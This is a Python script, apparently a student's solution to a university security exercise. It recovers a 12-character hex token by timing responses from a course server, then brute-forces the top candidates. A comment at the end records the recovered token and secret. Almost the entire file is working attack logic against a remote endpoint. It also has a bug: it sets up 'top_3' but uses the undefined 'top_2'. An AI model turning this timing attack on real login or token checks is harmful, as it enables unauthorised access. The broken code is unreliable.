import requests
import json
import pickle
import numpy as np
import operator
import string
import itertools



hexchars = string.hexdigits
    
top_3 = {}
    
token = '************'

for l in range(12):
    top_3[l] = []
    timings = {}
        
    for ch in hexchars:
        timings[ch] = []
        token_chars = list(token)
        token_chars[l] = ch
        token = "".join(token_chars)
        print(token)
        payload = {"email": "mateusz.paluchowski@epfl.ch", "token": token}

        for i in range(2):
            r = requests.post("http://com402.epfl.ch/hw5/ex3", json=payload)
            if r.ok:
                print(payload)
                print(r.text)
                
            timings[ch] += [r.elapsed.total_seconds()]
    # print(timings)
    mean = {}
    for key in timings:
        mean[key] = np.mean(timings[key])
    top_2_list = sorted(mean.items(), key=operator.itemgetter(1), reverse=True)[:2]
    print(top_2_list)
    top = [char for (char, time) in top_2_list]
    top_2[l] = top
    token_chars = list(token)
    token_chars[l] = top[0]
    token = "".join(token_chars)
    print(token)
        
print(top_2)
with open('top.pickle', 'wb') as handle:
    pickle.dump(top_2, handle, protocol=pickle.HIGHEST_PROTOCOL)

for combination in itertools.product(top_2[0], top_2[1], top_2[2], top_2[3], top_2[4], top_2[5], top_2[6], top_2[7], top_2[8], top_2[9], top_2[10], top_2[11]):
    comb = "".join(combination)
    payload = {"email": "mateusz.paluchowski@epfl.ch", "token": comb}
    r = requests.post("http://com402.epfl.ch/hw5/ex3", json=payload)
    if r.ok:
        print(payload)
        print(r.text)
        break
print('We are done here.')

'''
{'email': 'mateusz.paluchowski@epfl.ch', 'token': 'a0dad450a252'}
OKSC8ftWU4O0SimyxCBU3/trdfqpPFk9LbIkRA71h00=
'''